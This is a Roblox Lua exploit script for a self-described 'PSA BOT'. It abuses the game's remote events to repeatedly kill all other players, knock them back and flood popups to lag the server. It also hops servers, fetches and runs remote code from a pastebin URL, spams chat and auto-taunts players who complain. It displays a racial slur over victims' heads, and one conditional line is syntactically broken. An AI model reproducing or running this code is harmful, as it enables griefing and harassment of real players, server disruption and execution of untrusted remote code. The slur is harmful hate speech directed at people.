spawn(function()
	done = false
	repeat
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name == "PenguiniteR"
			done = true
			--psa destroyer
			local player = game.Players.LocalPlayer
			--key

			local remote = game.ReplicatedStorage.Remotes.RequestKey
			remote.OnClientEvent:Connect(function(v)
			keys = v 
			end)
			remote:FireServer()
			wait(1)




			--kill

			-- for i,v in pairs(game.Players:GetPlayers()) do
			--     if v.Name ~= game.Players.LocalPlayer.Name then
			--         pcall(function()
			--             local target = v
			--             local plr = target.Name
			--             local name = workspace[plr]
			--             local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
			--             local DMG = tonumber(plrHP) * 2
			--             local ohTable5 = {
			--                 ["critgen"] = {
			--                     ["amt"] = 60
			--                 }
			--             }
			--             game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(name, DMG, nil, nil, nil, nil, nil, nil, keys)
			--             --game:GetService("ReplicatedStorage").Remotes.HitJunction:FireServer(name, vec, 999, tonumber(plrHP), ohTable5, nil, nil, nil, nil, nil, keys)
			--         end)
			--     end
			-- end

			--loopkill

			spawn(function()
				while wait() do
					for i,v in pairs(game.Players:GetPlayers()) do
						if v.Name ~= game.Players.LocalPlayer.Name then
							pcall(function()
								local target = v
								local plr = target.Name
								local name = workspace[plr]
								local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
								local DMG = tonumber(plrHP)
								local ohTable5 = {
									["critgen"] = {
										["amt"] = 60
									}
								}
								game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(name, DMG, nil, nil, nil, nil, nil, nil, keys)
								--game:GetService("ReplicatedStorage").Remotes.HitJunction:FireServer(name, vec, 999, tonumber(plrHP), ohTable5, nil, nil, nil, nil, nil, keys)
							end)
						end
					end
					wait(10)
					local ohString1 = "[PSA BOT] killing players in 3 seconds"
					local ohString2 = "All"

					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
					wait(3)
				end
			end)

			--auto hop

			spawn(function()
				while wait() do
					local playercount = 0
					players = {}
						for _, v in pairs(game.Players:GetChildren()) do
						table.insert(players, v.Name)
						end
					playercount = #players
					
						if playercount < 4 then
							local ohString1 = "not enough players, hopping server"
							local ohString2 = "All"

							game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
							wait(1)
							local x = {}
							for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
								if type(v) == "table" and v.maxPlayers ~= nil then
									if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
										x[#x + 1] = v.id
									end
								else
									local lp,po,ts = game:GetService('Players').LocalPlayer,game.CoreGui.RobloxPromptGui.promptOverlay,game:GetService('TeleportService')
									ts:Teleport(game.PlaceId)
								end
							end
							if #x > 0 then
								game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
							else
								local ohString1 = "hopping server failed, Rejoining."
								local ohString2 = "All"
				
								game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
								wait(1)
								local lp,po,ts = game:GetService('Players').LocalPlayer,game.CoreGui.RobloxPromptGui.promptOverlay,game:GetService('TeleportService')
								ts:Teleport(game.PlaceId)
								return
							end
						end
				end
			end)

			--knockback


			spawn(function()
				while true do
					shit = game.Players:GetPlayers()
					for i = 1, #shit do local v = shit[i]
						if v ~= player and v:FindFirstChild("Alive") and pcall(function() return v.Character.HumanoidRootPart,player.Backpack.Core.Client end) and player:DistanceFromCharacter(v.Character.HumanoidRootPart.Position) < 40000 then
							pcall(function()
								local vec = player.Character.HumanoidRootPart.Position
								game:GetService("ReplicatedStorage").Remotes.Knockback:FireServer(v.Character, vec, -150, nil, 4, keys)

								local name = v.Name
								local ohVector31 = Vector3.new(workspace[name].Head.Position.X, workspace[name].Head.Position.Y, workspace[name].Head.Position.Z)
								local ohString2 = "L Nigger😂😂😂"
								local ohColor33 = Color3.new(255, 255, 0)

								game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, ohColor33)
								wait(0.3)
							end)
						end
					end
					wait()
				end
			end)

			--lag function
			loadstring(game:HttpGet("https://pastebin.com/raw/RjtRMEZk", true))()
			Lag = false
			spawn(function()
				while true do
					for i,v in pairs(game:GetService("Players"):GetPlayers()) do
						if v.Name ~= game.Players.LocalPlayer.Name then
							pcall(function()
								local name = v.Name
								local ohVector31 = Vector3.new(workspace[name].Head.Position.X, workspace[name].Head.Position.Y, workspace[name].Head.Position.Z)
								local ohString2 = Lagger
								

								local time = 50
								if Lag == true then
									while time > 0 do
										game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, Colr)
										time = time - 1
										wait(0.1)
									end
								end

								wait(15)
								Lag = true
								local ohString1 = "[PSA BOT] lagging server in 3 seconds"
								local ohString2 = "All"
								game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
								wait(3)
							end)
						end
					end
					wait()
				end
			end)

			--autorj

			spawn(function()
				repeat wait() until game.CoreGui:FindFirstChild('RobloxPromptGui')

				local lp,po,ts = game:GetService('Players').LocalPlayer,game.CoreGui.RobloxPromptGui.promptOverlay,game:GetService('TeleportService')

				po.ChildAdded:connect(function(a)
					if a.Name == 'ErrorPrompt' then
						repeat
							ts:Teleport(game.PlaceId)
							wait(2)
						until false
					end
				end)
			end)

			--😳
			spawn(function()
				local rand = math.random(7,15)
				while true do
					local rand = math.random(7,15)
					local ohString1 = "[PSA BOT] WE LOVE PSA!"
					local ohString2 = "All"
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
					wait(rand)
				end
			end)


			--chat bot
			local StringToDetect = {"hack", "trash", "fatherless", "mad", "loser", "stop", "report", "kid", "exploit", "life", "clown"}
			local LPlayer = game.Players.LocalPlayer
			local replies = {"cope", "mald", "seethe", "didn't ask", "mad?"}
			ready = false
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name ~= LPlayer.Name then
					v.Chatted:Connect(function(Message)
						for i, v in pairs(StringToDetect) do
							local randomizer = math.random(1,5)
							if string.find(string.lower(Message), string.lower(v)) then
								if ready == false then
									local ohString1 = tostring("[PSA BOT] "..replies[randomizer])
									local ohString2 = "All"
									wait()
									game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
									ready = true
									wait(3)
									ready = false
								end;
							end;
						end
					end);
				end
			end

			wait(3)
			local ohString1 = "[PSA BOT] Loaded"
			local ohString2 = "All"
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)

			wait(3)

			local ohString1 = "[PSA BOT] flinging everyone"
			local ohString2 = "All"
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)

			wait(100)
			local ohString1 = "[PSA BOT] rejoining..."
			local ohString2 = "All"
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)

			local lp,po,ts = game:GetService('Players').LocalPlayer,game.CoreGui.RobloxPromptGui.promptOverlay,game:GetService('TeleportService')
			ts:Teleport(game.PlaceId)
		end
		wait(1)
	until done == true
end)
